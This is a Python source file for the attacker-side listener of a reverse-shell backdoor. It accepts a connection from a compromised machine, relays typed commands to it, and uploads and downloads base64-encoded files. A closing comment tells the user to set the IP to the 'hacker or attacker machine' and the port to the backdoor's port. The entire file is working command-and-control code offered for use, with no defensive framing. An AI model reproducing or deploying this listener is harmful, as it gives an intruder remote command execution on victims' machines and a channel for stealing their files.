#!/usr/bin/python3

import socket
import json
import base64


class Listener:

    # Creating a constructor method
    
    def __init__(self,ip,port):
        listen_sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        listen_sc.bind((ip,port))
        listen_sc.listen(0)
        print("[+] Waiting for a connection...")
        self.target_connection , target_address = listen_sc.accept()
        print("[+] Connection successful!!!" + str(target_address))

    # Creating a method for sending data
    
    def send_reliably(self,data):
        json_data = json.dumps(data)
        self.target_connection.sendall(json_data.encode('utf-8'))

    # Creating a method for recieving data
    
    def rcv_reliably(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.target_connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
    # Creating a method for checking exit command
    
    def send_recieve_cmd(self, cmd):
        self.send_reliably(cmd)
        if cmd[0]== "exit":
            self.target_connection.close()
            exit()
        return  self.rcv_reliably()

    # Creating a method for writing files
    
    def write_file(self, filename, contents):
        with open(filename, "wb") as file:
            file.write(base64.b64decode((contents.encode('utf-8'))))
            return ("[+] Successfully downloaded!!!")
    #Creating a method for reading files
    
    def read_file(self, filename):
        with open(filename, "rb") as file:
            return (base64.b64encode(file.read()))
        

    def execute(self):
        while True:
            cmd = input(">>>")

    # Splitting the given command
    
            cmd = cmd.split()

            try:
                if cmd[0] == "upload":
                    contents = self.read_file(cmd[1])
                    cmd.append(contents.decode("utf-8"))


                output = self.send_recieve_cmd(cmd)
                if cmd[0] == "download" and "[-] Error " not in output:
                    output = self.write_file(cmd[1],output)
           
            
            except Exception:
                output = "[-] Error during command execution!!!"

            print (output)

# Change the ip address to the hacker or attacker machine and port number to the rbackdoor port number 

my_listener = Listener("192.168.80.1", 8080)
my_listener.execute()

